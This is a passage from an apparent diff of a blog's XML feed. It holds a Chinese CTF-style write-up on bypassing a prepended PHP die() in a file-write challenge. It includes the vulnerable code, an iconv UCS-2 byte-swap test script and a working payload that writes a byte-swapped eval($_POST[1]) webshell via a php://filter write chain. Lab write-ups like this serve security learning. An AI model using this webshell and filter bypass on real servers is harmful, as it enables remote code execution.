naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
-
-
-<p>又是要绕过死亡die，把常用都禁用了，在官网上有其他的</p>
-<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的编码方式</a></p>
-<p>UCS-2LE UCS-2BE编码</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;);</span></span><br><span class="line"><span class="string">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span></span><br><span class="line"><span class="string">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>本来想用4的试试，但是php die 不满足条件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">post:</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_13.png"></p>
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件包含</tag>
-        <tag>练习题</tag>
       </tags>
   </entry>
   <entry>
